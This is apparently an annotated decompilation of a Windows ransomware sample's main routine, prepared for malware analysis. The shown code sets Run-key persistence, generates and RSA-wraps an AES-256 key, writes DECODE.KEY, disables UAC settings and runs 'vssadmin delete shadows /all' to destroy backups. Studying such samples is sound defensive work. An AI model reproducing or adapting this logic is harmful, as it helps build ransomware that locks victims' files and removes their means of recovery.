WPARAM FUN_004018a0(void)

{
  int iVar1;
  DWORD DVar2;
  BOOL ret_val;
  LSTATUS LVar4;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  DWORD local_78;
  uint *local_74;
  DWORD local_70;
  HCRYPTPROV local_6c;
  HANDLE local_68;
  HCRYPTKEY handle_enc_key;
  DWORD local_60;
  DWORD local_58;
  HKEY handle_reg_key;
  tagMSG local_50;
  WNDCLASSEXA local_34;
  
  int local_80 = 0;
  
  /* Allocates the specified number of bytes from the heap.
        uFlags = 0x40 : GMEM_ZEROINIT (Initializes memory contents to zero)
        dbBytes = 0x8000 : The number of bytes to allocate */
  uint *current_exec_path = (uint *)GlobalAlloc(0x40,0x8000); 

  /* Retrieves the fully qualified path for the file that contains the specified module
        hModule : If this parameter is NULL, retrieves the path of the executable file of the current process
        lpFilename = Pointer to a buffer that receives the fully qualified path of the module
        nSize = size of lpFilename buffer */
  GetModuleFileNameA((HMODULE)0x0,(LPSTR)current_exec_path,0x8000); 

  /* Compares two character strings. The comparison is not case-sensitive. 
    lpString1 > lpString2 : iVar1 > 0
    lpString1 < lpString2 : iVar1 < 0 
    lpString1 == lpString2 : iVar1 = 0*/
  iVar1 = lstrcmpiA(s_c:\Windows\notepad+++.exe_00404585,(LPCSTR)current_exec_path); // s_c:\Windows\notepad+++.exe_00404585 == "c:\\Windows\\notepad+++.exe"

  // Only enter if current_exec_path != "c:\\Windows\\notepad+++.exe"
  if (iVar1 != 0) {
        /* Opens the specified registry key.
            hKey = 0x80000002 = HKEY_LOCAL_MACHINE : A handle to an open registry key.
            lpSubKey = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" : The name of the registry subkey to be opened.
            ulOptions : Specifies the option to apply when opening the key.
            samDesired : A mask that specifies the desired access rights to the key to be opened.
            phkResult : A pointer to a variable that receives a handle to the opened key.
        */
        RegOpenKeyExA((HKEY)0x80000002,s_SOFTWARE\Microsoft\Windows\Curre_0040450f,0,0xf013f,&handle_reg_key);

        /* Determines the length of the specified string
            lpString = "c:\\Windows\\notepad.exe \"c:\\How To Restore Files.txt\""
        */
        DVar2 = lstrlenA(s_c:\Windows\notepad.exe_"c:\\How_T_00404546");

        /* Sets the data and type of a specified value under a registry key.
            hKey : A handle to an open registry key.
            lpValueName = s_decrypt_0040453e = "decrypt" : The name of the value to be set.
            Reserved : This parameter is reserved and must be zero.
            dwType = 1 = REG_SZ = a string : The type of data pointed to by the lpData parameter. 
            lpData = "c:\\Windows\\notepad.exe \"c:\\How To Restore Files.txt\"" : The data to be stored.
            cbData : The size of the information pointed to by the lpData parameter, in bytes.
        */
        RegSetValueExA(handle_reg_key,s_decrypt_0040453e,0,1,(BYTE *)s_c:\Windows\notepad.exe_"c:\How_T_00404546",DVar2);
        
        /* Determines the length of the specified string
            lpString = "c:\\Windows\\notepad+++.exe"
        */
        DVar2 = lstrlenA(s_c:\Windows\notepad+++.exe_00404585);
        
        /* Sets the data and type of a specified value under a registry key.
            hKey : A handle to an open registry key.
            lpValueName = s_notepad++_0040457b = "notepad++" : The name of the value to be set.
            Reserved : This parameter is reserved and must be zero.
            dwType = 1 = REG_SZ = a string : The type of data pointed to by the lpData parameter. 
            lpData = "c:\\Windows\\notepad+++.exe" : The data to be stored.
            cbData : The size of the information pointed to by the lpData parameter, in bytes.
        */
        RegSetValueExA(handle_reg_key,s_notepad++_0040457b,0,1,(BYTE *)s_c:\Windows\notepad+++.exe_00404585,DVar2);
        
        /* Closes a handle to the specified registry key.
            hKey : A handle to the open key to be closed.
        */
        RegCloseKey(handle_reg_key);
        
        /* Copies an existing file to a new file.
            lpExistingFileName : The name of an existing file.
            lpNewFileName = "c:\\Windows\\notepad+++.exe" : The name of the new file.
            bFailIfExists
        */
        CopyFileA((LPCSTR)current_exec_path,s_c:\Windows\notepad+++.exe_00404585,0);
        
        local_80 = 5;
  }

  /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
  This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
        phProv : A pointer to a handle of a CSP.
        szContainer : The key container name
        szProvider : A null-terminated string that contains the name of the CSP to be used.
        dwProvType = 0x1 = PROV_RSA_FULL : Specifies the type of provider to acquire.
        dwFlags = 0x10 = CRYPT_DELETEKEYSET : Flag values.
  */
  CryptAcquireContextA((HCRYPTPROV *)&local_68,(LPCSTR)0x0,(LPCSTR)0x0,1,0x10); // Delete key container specified by szContainer

   /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
  This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
        dwFlags = 0xf0000000 = CRYPT_VERIFYCONTEXT : Flag values.
  */
  ret_val = CryptAcquireContextA((HCRYPTPROV *)&local_68,(LPCSTR)0x0,(LPCSTR)0x0,1,0xf0000000);

  // If CryptAcquireContextA failed
  if (ret_val == 0) {
      /* s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_004043f6 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-Microsoft Enhanced Cryptographic Provider v1.0" */
    CryptAcquireContextA((HCRYPTPROV *)&local_68,(LPCSTR)0x0,s_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdef_004043f6 + 0x40,1,0xf0000000);
  }

  /* The CryptImportKey function transfers a cryptographic key from a key BLOB into a cryptographic service provider (CSP) 
    hProv : The handle of a CSP obtained with the CryptAcquireContext function
    pbData : A BYTE array that contains a PUBLICKEYSTRUC BLOB header followed by the encrypted key
    dwDataLen : Contains the length, in bytes, of the key BLOB
    hPubKey : A handle to the cryptographic key that decrypts the key stored in pbData.
    dwFlags : Currently used only when a public/private key pair in the form of a PRIVATEKEYBLOB is imported into the CSP.
    phKey : A pointer to a HCRYPTKEY value that receives the handle of the imported key.
  */
  CryptImportKey((HCRYPTPROV)local_68,&DAT_004049fd,0x114,0,0,&handle_enc_key);

  /* Acquire a handle to a particular key container within a particular cryptographic service provider (CSP).
  This returned handle is used in calls to CryptoAPI functions that use the selected CSP.
        dwProvType = 0x18 = PROV_RSA_AES : Specifies the type of provider to acquire.
        dwFlags = 0xf0000000 = CRYPT_VERIFYCONTEXT : Flag values.
  */
  CryptAcquireContextA(&local_6c,(LPCSTR)0x0,(LPCSTR)0x0,0x18,0xf0000000);
  
  /*The CryptGenKey function generates a random cryptographic session key or a public/private key pair. 
    A handle to the key or key pair is returned in phKey. This handle can then be used as needed with 
    any CryptoAPI function that requires a key handle.
        hProv : A handle to a cryptographic service provider (CSP) created by a call to CryptAcquireContext.
        Algid = 0x6610 = CALG_AES_256 : An ALG_ID value that identifies the algorithm for which the key is to be generated.
        dwFlags : Specifies the type of key generated.
        phKey : Address to which the function copies the handle of the newly generated key. 
  */
  CryptGenKey(local_6c,0x6610,1,&DAT_00404b20);

  local_70 = 0x2c;
  /* The CryptExportKey function exports a cryptographic key or a key pair from a cryptographic
     service provider (CSP) in a secure manner.
     hKey : A handle to the key to be exported.
     hExpKey : A handle to a cryptographic key of the destination user. 
     dwBlobType = 8 = PLAINTEXTKEYBLOB : Specifies the type of key BLOB to be exported in pbData. 
     dwFlags : Specifies additional options for the function.
     pbData : A pointer to a buffer that receives the key BLOB data
     pdwDataLen : A pointer to a DWORD value that, on entry, contains the size, in bytes, of the buffer pointed to by the pbData parameter. When the function returns, this value contains the number of bytes stored in the buffer.
  */
  CryptExportKey(DAT_00404b20,0,8,0,(BYTE *)current_exec_path,&local_70);

  local_70 = 0x2c;

  /* The CryptEncrypt function encrypts data.
        hKey : A handle to the encryption key.
        hHash : A handle to a hash object
        Final : A Boolean value that specifies whether this is the last section in a series being encrypted.
        dwFlags : The following dwFlags value is defined but reserved for future use.
        pbData : A pointer to a buffer that contains the plaintext to be encrypted.
        pdwDataLen : A pointer to a DWORD value that , on entry, contains the length, in bytes, of the plaintext in the pbData buffer. 
        dwBufLen : Specifies the total size, in bytes, of the input pbData buffer.
  */
  CryptEncrypt(handle_enc_key,0,1,0,(BYTE *)current_exec_path,&local_70,0x100);

  
  CryptDestroyKey(handle_enc_key);

  CryptAcquireContextA((HCRYPTPROV *)&local_68,(LPCSTR)0x0,(LPCSTR)0x0,1,0x10);
  local_68 = CreateFileA(s_c:\Windows\DECODE.KEY_004042ea,0xc0000000,0,(LPSECURITY_ATTRIBUTES)0x0,4,
                         0,(HANDLE)0x0);
  SetFilePointer(local_68,0,(PLONG)0x0,2);
  WriteFile(local_68,current_exec_path,0x100,&local_58,(LPOVERLAPPED)0x0);
  CloseHandle(local_68);
  local_74 = current_exec_path + 0x100;
  FUN_00401816(extraout_ECX,extraout_EDX,current_exec_path,(undefined *)local_74,0x100);
  local_74 = local_74 + 4;
  RtlMoveMemory(s_Important_!!!_Your_personal_id_-_0040405a + 0x22,local_74,10);
  MultiByteToWideChar(3,0,(LPCSTR)local_74,-1,u__id-_004042c1 + 4,10);
  RegOpenKeyExA((HKEY)0x80000002,s_SOFTWARE\Microsoft\Windows\Curre_004044db,0,0xf013f,&handle_reg_key);
  local_78 = 10;
  LVar4 = RegQueryValueExA(handle_reg_key,s_notepad++_0040457b,(LPDWORD)0x0,(LPDWORD)0x0,
                           (LPBYTE)(s_Important_!!!_Your_personal_id_-_0040405a + 0x22),&local_78);
  if ((LVar4 != 0) || (local_78 != 10)) {
    RegSetValueExA(handle_reg_key,s_notepad++_0040457b,0,1,(BYTE *)local_74,10);
  }
  *(undefined4 *)((int)local_74 + 10) = 0;
  RegSetValueExA(handle_reg_key,(LPCSTR)local_74,0,3,(BYTE *)current_exec_path,0x100);
  RegCloseKey(handle_reg_key);
  RtlZeroMemory(current_exec_path,0x8000);
  RegOpenKeyExA((HKEY)0x80000002,s_SOFTWARE\Microsoft\Windows\Curre_00404465,0,0xf013f,&handle_reg_key);
  RegSetValueExA(handle_reg_key,s_PromptOnSecureDesktop_004044a0,0,4,(BYTE *)current_exec_path,4);
  RegSetValueExA(handle_reg_key,s_EnableLUA_004044b6,0,4,(BYTE *)current_exec_path,4);
  RegSetValueExA(handle_reg_key,s_ConsentPromptBehaviorAdmin_004044c0,0,4,(BYTE *)current_exec_path,4);
  RegCloseKey(handle_reg_key);
  GetEnvironmentVariableA(s_ComSpec_00404317,(LPSTR)current_exec_path,0x5dc);
  ShellExecuteA((HWND)0x0,(LPCSTR)0x0,(LPCSTR)current_exec_path,s_/c_vssadmin_delete_shadows_/all_004043d6,
                (LPCSTR)0x0,0);
  GlobalFree(current_exec_path);
  SetErrorMode(1);
  CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,FUN_00401eda,(LPVOID)0x0,0,&local_60);
  InitCommonControls();
  local_34.cbSize = 0x30;
  local_34.style = 3;
  local_34.lpfnWndProc = (WNDPROC)&LAB_00401cd5;
  local_34.cbClsExtra = 0;
  local_34.cbWndExtra = 0x1e;
  local_34.hInstance = DAT_00404b2c;
  local_34.hbrBackground = (HBRUSH)0x10;
  local_34.lpszClassName = s_notepad++_0040457b;
  RegisterClassExA(&local_34);
  CreateDialogParamA(DAT_00404b2c,(LPCSTR)0x65,(HWND)0x0,(DLGPROC)&LAB_00401cd5,0);
  ShowWindow(DAT_00404b28,local_80);
  UpdateWindow(DAT_00404b28);
  while (ret_val = GetMessageA((LPMSG)&local_50,(HWND)0x0,0,0), ret_val != 0) {
    TranslateMessage((MSG *)&local_50);
    DispatchMessageA((MSG *)&local_50);
  }
  CryptDestroyKey(DAT_00404b20);
  return local_50.wParam;
}
